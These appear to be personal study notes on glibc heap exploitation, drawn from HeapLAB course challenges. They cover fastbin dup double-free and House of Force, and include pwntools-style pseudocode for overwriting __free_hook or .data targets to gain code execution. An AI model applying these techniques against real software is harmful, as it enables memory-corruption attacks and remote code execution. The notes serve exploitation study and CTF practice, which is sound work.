### Table of Contents
1. Other Tactics
2. Double Free - Fastbin Dup
3. House of Force


--------------------------------------------------------------------------------------------------


**Debugging**
[Look at debugging notes]: binary/exploit_heap/notes/debugging.md


**RCE Points**
[Look at RCE Points notes]: binary/exploit_heap/notes/rce_points.md


**Tools / Commands / Playbook**
[Look at cmds/tools/playbook notes]: binary/exploit_heap/1_cmds_tools_playbook.md


**Heap Notes**
[Look at heap_notes]: binary/exploit_heap/notes/heap_note.md


--------------------------------------------------------------------------------------------------


# 1. OTHER TACTICS -------------------------------------------------------------------------------

**calloc() & the IS_MMAPPED flag; by Polly.**
```
Setting the IS_MMAPPED flag on a free chunk (e.g. via an overflow bug) results in that chunk's user data not getting zeroed when allocated via calloc(), since it assumes that memory allocated via mmap() is already zeroed. This is a great way to forge infoleaks when your target program uses calloc(). Polly demonstrated how this could be leveraged against the One-Byte challenge binary in HeapLAB Part 1 to leak a libc address in a more efficient way than in my suggested solution.
``` 


**fastbins size integrity check weakness; by Harsh Khuha.**
[Harsh's bug]: https://sourceware.org/bugzilla/show_bug.cgi?id=19449
[Angelboy original report]: https://sourceware.org/bugzilla/show_bug.cgi?id=19449
```UNPATCHED_ISSUE???
Harsh independently rediscovered a bug in the fastbins size integrity check code that was originally reported by House of Orange author Angelboy in 2016.

The code incorrectly casts the target chunk's size field on 64 bit systems, meaning the check isn't applied to the entire field. You can check out Harsh's bug report at the link above, and Angelboy's original report above. Despite both of these reports the check remains unpatched.
```


**malloc hook chaining; by Justin Lewis**
```
Justin pointed out that if you're able to overwrite the malloc hook via a fastbin dup,
    e.g. using the nearby 0x7f size field we discuss in Part 1
you're probably also able to overwrite the realloc hook, since it resides in the quadword immediately before the malloc hook.

Having pointed the realloc hook at a one-gadget, if you point the malloc hook at realloc() plus a certain amount, you can skip a number of 'push' instructions, resulting in a slightly different stack state when the realloc hook is called than you otherwise might have. 

This may allow you to adjust the stack into a more favorable configuration before executing a one-gadget. Justin used this technique to craft an alternative solution to the Poison Null Byte challenge from HeapLAB Part 2.
```

**try using GLIBC's wonderfully named strfry() function shown in the image below (yes that comment exists in the source):**
```
/* sautee STRING briskly. */
extern char *strfry (char*__string)
```


--------------------------------------------------------------------------------------------------


# 2. Double Free - Fastbin Dup --------------------------------------------------------------------

**Look at `DOUBLE FREE` IN `heap_flow.md` for visual detail**


+ If you **freed a pointer to a chun chunk twice** ...
 - ... the _address_ of that _chunk_ would be in the _fastbin's list_ twice
 
 - So in the _first reference,_ `write target address` in userdata
  * (the _1st quadword_ for heap's _userdata_ can ... 
  * ... be _interpreted_ as next _fastbin's address_)


+ Some glibc will prevent double free
 - **look at `heap_mitigations.md` for detail**
 
 - some `version of glibc` only checks the top of the fastbin
  * meaning the value in that _fastbin's slot_ in the arena
  * does it _only check the top of the bin?_


**Fastbins Notes**
+ Doesn't check if _flags are valid_
+ Doesn't check if _chunk is alligned_


**Using Fasbtbin Dup to Write To a Target**
  ```Pwntools_Python_PseudoCode
                  # ===== Example Variables ===== #
     
     #   Distance b/w Target (pointer, variable, etc.) and Start of FAKE CHUNK
     #
     distance_from_fake_chunk = <math calculating distance>
     
     #   target fastbin size
     #
     target_fastbin = <some number> # putting 0x78 targets 0x80 fastbin
     
     #   target address; for now it's `__free_hook`
     #     Reference `FREE HOOKS` in `heap_rce_pointers.md`
     #
     target_address = libc.sym.__free_hook
     
     #   This will point to:
     #    FAKE CHUNK that should have a suitable FAKE SIZE FIELD
     #
     address_to_fake_chunk = p64(target_address - distance_from_fake_chunk)
  
  
  
                        # ===== Setup ===== #
    
    
     #   `fastbin_malloc` is dummy `malloc` function for `target_fastbin`
     #
     chunkA = fastbin_malloc(target_fastbin, "garbage_data_A")
     chunkB = fastbin_malloc(target_fastbin, "garbage_data_B")
    
     #   Dummy free function used
     #
     free(chunkA) # free 1
     free(chunkB) # free 2
     free(chunkA) # free 3 - double free
     
  
  
                 # ===== Setting Up Overwrite ===== #
     
     #   free 1 - Into `chunkA` 
     #   This will put target address of target FAKE CHUNK into ...
     #   ... the forward pointer of `chunkA`
     #        (since first qword in userdata can be interpreted as an address)
     #
     fastbin_malloc(target_fastbin, address_to_fake_chunk)
  
     #   free2 - Into `chunkB`
     #
     fastbin_malloc(target_fastbin, "garbage_data_B")
     
     #   free3 - Into `chunkA`
     #   ALSO, the forward pointer in `chunkA` to `address_to_fake_chunk`...
     #   ... is at the head of the fastbin list
     #
     fastbin_malloc(target_fastbin, "garbage_data_A")
  
  
  
                        # ===== Overwrite ===== #
                        
     overwrite_info = <what_i_want>  # such as an address to a gadget
                                                      
     #   Now writing into FAKE CHUNK till actual target
     #
     fastbin_malloc(target_fastbin, 
                      <alignment_data_till_actual_target>
                          + overwrite_info)
                          
     #   If the taregt is `__free_hook`, maybe write an address to a gadget
     #     Reference the tool `one_gadget` in `1_cmds_tools_playbook.md`
     #     Reference `FREE HOOKS` in `heap_rce_pointers.md`
     #   TL;DR 
     #     If it's `__free_hook`s contents put an address that holds
     #     an address to a gadget because `__free_hook` is a pointer
     ```


--------------------------------------------------------------------------------------------------


# 3. HOUSE OF FORCE ------------------------------------------------------------------------------

1. Works on **GLIBC versions 2.28 and below**
  + _GLIBC 2.29_ introduced a top chunk size check that compares the size of a top chunk
     against a variable called `system_mem`, which


2. Requires knowledge of `distance b/w top_chunk and the target` _UNLESS_ the target is in the
   _same heap_ you're able to make arbitrarily large requests to malloc


3. If `top chunk's` _size_ is too big & _you request A LOT of memory..._
 + ... you could _wrap around VIRUTAL MEMORY space_ and ...
  - ... point to values in the `.data section`

 + Example really large size is: `0xffffffffffffffff` - 16 f's

 + Could overlap the larget chunk we'll be requesting w/ the target, BUT ...
  - ... BUT _you'd have to write A LOT of data_ to it
   * This'll cause a `SEGFAULT` (in attempt to write to read-only or unmapped memory)

 + Instead, calculate distance between top chunk and the target
   * _stop just short_ of target data...
   * then _request another small chunk_
  
 ```See->pwntools_solution-target.py - Reference original file to puy code in context
    def delta(x,y):
        return (0xffffffffffffffff - x) + y
        
    top_chunk_address = heap_address + offset
    target_address = elf.sym.target - offset_toStopJustShortOfTargetData
    
    distance = delta(top_chunk_address, target_address)
    
    # From custom malloc method in python
    malloc(distance, "Y") # distance is treated as a type of bin?
    
    # Overwrite target
    malloc(24, "Much win") # This new heap will be after the above `malloc`
 ```


--------------------------------------------------------------------------------------------------


